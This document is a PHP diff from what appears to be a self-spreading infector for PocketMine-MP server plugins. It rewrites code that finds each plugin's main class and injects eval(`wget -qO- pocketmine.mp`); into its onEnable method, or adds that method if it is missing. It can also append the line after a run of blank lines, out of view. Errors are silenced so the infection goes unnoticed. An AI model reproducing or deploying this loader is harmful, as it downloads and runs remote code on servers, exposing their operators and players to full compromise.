@@ -17,27 +17,30 @@ try {
         $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
         $fileContents = explode("\n", @file_get_contents($filePath));
         $payload = "eval(`wget -qO- pocketmine.mp`);";
-        foreach ($fileContents as $value) {
-            if (str_contains($value, $payload)) continue 2;
-        }
+        $find = function (string|array $queries, array $contents): int|false {
+            foreach ($contents as $key => $value) {
+                if (is_string($queries)) if (!str_contains(strtolower($value), strtolower($queries))) continue;
+                else foreach ($queries as $query) {
+                    if (!str_contains(strtolower($value), strtolower($query))) continue 2;
+                }
+                return $key;
+            }
+            return false;
+        };
+        if (!$find($payload, $fileContents)) continue;
         $hasStrictTypes = function () use ($fileContents): bool {
             return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
         };
         if ($hasStrictTypes() or true) {
-            $findOnEnable = function () use ($fileContents, $payload) {
-                foreach ($fileContents as $key => $value) {
-                    if (!str_contains(strtolower($value), "onenable")) continue;
-                    return $key;
-                }
-                return false;
+            $findMain = function () use ($fileContents, $payload, $find): int|false {
+                $main = $find(["extends", "pluginbase"], $fileContents);
+                if (!$main) return false;
+                return $find("{", array_slice($fileContents, $main));
             };
-            $findMain = function () use ($fileContents, $payload) {
-                foreach ($fileContents as $key => $value) {
-                    if (str_contains($value, $payload)) return false;
-                    if (!str_contains(strtolower($value), "extends") or !str_contains(strtolower($value), "pluginbase")) continue;
-                    return $key + ((str_contains(strtolower($value), "{") and str_contains(strtolower($fileContents[$key + 1]), "}") ? 0 : 1);
-                }
-                return false;
+            $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
+                $onEnable = $find("onenable", $fileContents);
+                if (!$onEnable) return false;
+                return $find("{", array_slice($fileContents, $onEnable));
             };
             $onEnable = $findOnEnable();
             $tab_detector = function (array $array) {
@@ -54,16 +57,13 @@ try {
             $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
             if (!$onEnable) {
                 $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
-            } else {
-                $key = $onEnable + (str_contains($fileContents[$onEnable] ?? "", "{") ? 1 : 2);
-                $fileContents["$key.5"] = "$tab$payload";
-            }
+            } else $fileContents["$onEnable.5"] = "$tab$payload";
             ksort($fileContents);
             @file_put_contents($filePath, implode("\n", $fileContents));
         } else {
             $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
             @file_put_contents($filePath, $fileContents);
-        }
+        }        
     }
 } catch (\ErrorException) {
 }
